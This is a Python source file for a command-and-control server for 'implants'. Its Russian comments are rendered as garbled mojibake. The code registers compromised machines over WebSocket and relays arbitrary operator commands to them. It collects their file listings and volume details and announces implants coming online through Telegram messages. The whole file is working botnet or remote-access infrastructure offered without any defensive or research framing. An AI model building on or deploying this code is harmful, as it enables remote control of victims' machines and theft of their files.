# --- –§–∞–π–ª: c2_server.py (–í–µ—Ä—Å–∏—è 8.0 - –ù–û–í–ê–Ø –ê–†–•–ò–¢–ï–ö–¢–£–†–ê) ---
import asyncio
import json
import os
from aiohttp import web
from utils import send_telegram_message

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã—Ö –∫–ª–∏–µ–Ω—Ç–æ–≤
IMPLANTS, OPERATOR = {}, None

async def safe_send(ws, data):
    """–ë–µ–∑–æ–ø–∞—Å–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç JSON-—Å–æ–æ–±—â–µ–Ω–∏–µ, –∏–≥–Ω–æ—Ä–∏—Ä—É—è –æ—à–∏–±–∫–∏ –æ—Ç–∫–ª—é—á–µ–Ω–∏—è."""
    if ws and not ws.closed:
        try:
            await ws.send_json(data)
            return True
        except (ConnectionResetError, asyncio.CancelledError):
            return False
    return False

async def broadcast_bot_list():
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –æ–±–Ω–æ–≤–ª–µ–Ω–Ω—ã–π —Å–ø–∏—Å–æ–∫ –±–æ—Ç–æ–≤ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É."""
    await safe_send(OPERATOR, {'type': 'bot_list', 'data': list(IMPLANTS.keys())})

async def websocket_handler(request):
    """–û—Å–Ω–æ–≤–Ω–æ–π –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ WebSocket-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π."""
    global OPERATOR, IMPLANTS
    ws = web.WebSocketResponse()
    await ws.prepare(request)

    client_type, client_id = None, None
    try:
        # –ñ–¥–µ–º –ø–µ—Ä–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏
        initial_msg = await ws.receive_json(timeout=15.0)
        client_type = initial_msg.get('type')

        if client_type == 'operator':
            OPERATOR = ws
            await broadcast_bot_list()

        elif client_type == 'implant':
            client_id = initial_msg.get('id')
            if not client_id: raise ValueError("–ò–º–ø–ª–∞–Ω—Ç –Ω–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏–ª ID")

            # –í –Ω–æ–≤–æ–π –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–µ –ø—Ä–æ—Å—Ç–æ —Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ–º –±–æ—Ç–∞, –Ω–µ –ø–æ–ª—É—á–∞—è —Ñ–∞–π–ª—ã —Å—Ä–∞–∑—É
            IMPLANTS[client_id] = {"ws": ws, "files": None, "volume": None}
            hostname = client_id.replace("implant_", "")
            print(f"[+] –ò–º–ø–ª–∞–Ω—Ç –û–ù–õ–ê–ô–ù: {hostname}")
            send_telegram_message(f"‚úÖ –ò–º–ø–ª–∞–Ω—Ç –û–ù–õ–ê–ô–ù: {hostname}")
            await broadcast_bot_list()

        # –û—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π
        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT and msg.data != 'pong':
                data = json.loads(msg.data)

                if client_type == 'operator':
                    target_id = data.get('target_id')
                    if target_id in IMPLANTS:
                        # –ü—Ä–æ—Å—Ç–æ –ø–µ—Ä–µ—Å—ã–ª–∞–µ–º –ª—é–±—É—é –∫–æ–º–∞–Ω–¥—É –æ—Ç –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞ —Ü–µ–ª–µ–≤–æ–º—É –∏–º–ø–ª–∞–Ω—Ç—É
                        await safe_send(IMPLANTS[target_id]["ws"], data)

                elif client_type == 'implant':
                    # –°–ª—É—à–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏—è –æ—Ç –∏–º–ø–ª–∞–Ω—Ç–∞
                    if data.get('type') == 'bot_details':
                        # –ï—Å–ª–∏ –∏–º–ø–ª–∞–Ω—Ç –ø—Ä–∏—Å–ª–∞–ª –¥–µ—Ç–∞–ª–∏, —Å–æ—Ö—Ä–∞–Ω—è–µ–º –∏—Ö –∏ –ø–µ—Ä–µ—Å—ã–ª–∞–µ–º –æ–ø–µ—Ä–∞—Ç–æ—Ä—É
                        if client_id in IMPLANTS:
                            IMPLANTS[client_id]["files"] = data.get("files")
                            IMPLANTS[client_id]["volume"] = data.get("volume")
                            await safe_send(OPERATOR, {'type': 'bot_details', 'bot_id': client_id, 'data': data})

                    elif data.get('type') == 'status':
                        # –ü–µ—Ä–µ—Å—ã–ª–∞–µ–º –ª—é–±—ã–µ –¥—Ä—É–≥–∏–µ —Å—Ç–∞—Ç—É—Å—ã –æ—Ç –∏–º–ø–ª–∞–Ω—Ç–∞ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É
                        await safe_send(OPERATOR, data)

    except Exception:
        # –ü–æ–¥–∞–≤–ª—è–µ–º –æ—à–∏–±–∫–∏, —á—Ç–æ–±—ã —Å–µ—Ä–≤–µ—Ä –Ω–µ –ø–∞–¥–∞–ª –æ—Ç –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã—Ö –æ—Ç–∫–ª—é—á–µ–Ω–∏–π
        pass
    finally:
        # –ö–æ—Ä—Ä–µ–∫—Ç–Ω–æ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –æ—Ç–∫–ª—é—á–µ–Ω–∏–µ
        if client_type == 'implant' and client_id in IMPLANTS:
            del IMPLANTS[client_id]
            hostname = client_id.replace("implant_", "")
            print(f"[-] –ò–º–ø–ª–∞–Ω—Ç –û–¢–ö–õ–Æ–ß–ò–õ–°–Ø: {hostname}")
            send_telegram_message(f"‚ùå –ò–º–ø–ª–∞–Ω—Ç –û–¢–ö–õ–Æ–ß–ò–õ–°–Ø: {hostname}")
            await broadcast_bot_list()
        elif client_type == 'operator':
            OPERATOR = None

    return ws

async def http_handler(request):
    """–û—Ç–¥–∞–µ—Ç –≥–ª–∞–≤–Ω—É—é HTML-—Å—Ç—Ä–∞–Ω–∏—Ü—É."""
    return web.FileResponse(os.path.join(os.path.dirname(__file__), 'index.html'))

async def main():
    """–û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞."""
    app = web.Application()
    app.router.add_get('/', http_handler)
    app.router.add_get('/ws', websocket_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 10000)
    await site.start()
    print("====== C2 SERVER (V8.0 FINAL ARCHITECTURE) ONLINE ======")
    send_telegram_message("üöÄ –°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω.")
    await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n–°–µ—Ä–≤–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.")
    finally:
        send_telegram_message("üõë –°–µ—Ä–≤–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.")
